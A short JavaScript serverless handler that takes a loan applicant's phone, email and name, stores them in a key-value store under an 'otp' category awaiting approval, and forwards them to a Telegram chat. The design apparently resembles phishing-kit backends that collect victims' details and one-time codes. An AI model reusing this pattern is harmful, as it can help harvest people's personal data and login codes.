import { makeJsonResponse, makeTextResponse, uuidv4, setRequestInKV, sendTelegramNotification } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const { phone, userId, email, firstName, lastName } = body;
  if (!phone) {
    return makeJsonResponse({ error: "Missing required fields: phone" }, 400);
  }

  const requestId = uuidv4();
  const data = { phone, userId, email, firstName, lastName, approved: false, timestamp: new Date().toISOString() };

  await setRequestInKV(env, requestId, data, "otp");
  await sendTelegramNotification({ requestId, phone, email, firstName, lastName, type: "Loan Application Submission" }, env, request.url);

  return makeJsonResponse({ success: true, requestId });
}